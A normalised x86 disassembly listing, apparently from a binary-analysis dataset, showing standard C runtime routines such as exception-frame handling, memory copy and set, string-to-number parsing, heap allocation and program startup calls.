mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_410265
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_4134e0
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_410265
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_412cbd
add esp 0x20
pop ebp
retn
sub_41028a
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_410340
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_413593
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_410340
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_412cbd
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41018c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4103b5
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_41365b
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_41365b
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_410430
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410472
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_410450
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_410506
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41051e
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
push 0x19
call sub_4136da
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413750
pop ecx
pop ecx
jmp r-xdata
movzx bx [ esi ]
movzx eax bl
inc esi
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0xc ] bx
jne r-xdata
mov al [ esi ]
test al al
jne r-xdata
xor edx edx
inc edi
mov dh cl
mov dl al
mov [ ebp + 0xc ] edx
and [ ebp + 0xc ] 0x0
jmp r-xdata
push 0x19
call sub_41373b
cmp bx [ ebp + 0xc ]
pop ecx
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor ecx ecx
inc esi
mov ch bl
mov cl al
mov ebx ecx
xor ebx ebx
jmp r-xdata
push 0x19
call sub_41373b
pop ecx
xor eax eax
jmp r-xdata
movzx cx [ edi ]
movzx eax cl
inc edi
mov [ ebp + 0xc ] ecx
test [ eax + rw-data ] 0x4
je r-xdata
sub_4105cd
push esi
call sub_4114f8
push [ rw-data ]
call sub_411e9e
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_411e9e
add eax 0x10
push eax
push [ rw-data ]
call sub_4124ad
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_411501
mov eax esi
pop esi
retn
sub_41065d
push 0x80
call sub_410b8c
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_41098a
mov eax [ rw-data ]
pop ecx
sub_41068c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_4106f6
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
sub_41070e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_410776
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_41078e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_4107ec
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_410882
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_41429d
pop ecx
test eax eax
jne r-xdata
call sub_41352c
test eax eax
jne r-xdata
push 0x1c
call sub_4109af
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_413f6c
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_413e3a
mov [ rw-data ] eax
call sub_413bed
call sub_413b34
call sub_411404
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_413adc
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_4109af
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_41d687
mov [ ebp - 0x60 ] eax
push eax
call sub_411431
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_413964
pop ecx
pop ecx
retn
sub_4109d3
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_4136da
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_41373b
pop ecx
pop esi
retn
push esi
call sub_410cc6
pop ecx
sub_410a20
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_410a97
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_410ae0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_410b9e
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_410bca
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_4144ea
test eax eax
pop ecx
jne r-xdata
sub_410bca
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x9
call sub_4136da
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4148a1
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_410c31
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
add eax 0xf
and al 0xf0
push eax
push 0x1
pop eax
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp r-xdata
jmp r-xdata
push esi
jmp r-xdata
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_415344
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_410c90
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] esi
cmp esi [ rw-data ]
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
sub_410cc6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_4136da
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_41454d
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push esi
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_4152a8
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_410d30
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
push esi
push eax
call sub_414578
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_410d88
cmp [ ebp - 0x24 ] 0x0
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
call sub_4152ff
add esp 0xc
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_410dc6
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
test al 0x8
jne r-xdata
movsx eax bl
push eax
call sub_415719
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
test ebx ebx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
call sub_4129af
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0x14 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x8 ] eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
and eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] esi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_410ff0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_411050 ]
jmp [ ecx * 4 + jump_table_4110cc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411138 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_411138 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4112d0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4111d8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4112d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411138 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411138 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_411138 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4112d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4112d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4112d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4112d0 ]
sub_411325
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_411342
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
jne r-xdata
push 0x19
call sub_4136da
mov esi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415870
pop ecx
pop ecx
jmp r-xdata
push 0x19
call sub_41373b
mov eax [ ebp + 0xc ]
pop ecx
movzx ecx bx
sub eax ecx
neg eax
sbb eax eax
not eax
and eax esi
movzx eax bl
test [ eax + rw-data ] 0x4
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx eax bx
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
inc esi
jmp r-xdata
push 0x19
call sub_41373b
pop ecx
xor eax eax
jmp r-xdata
movzx ecx bx
movzx eax al
shl ecx 0x8
or ecx eax
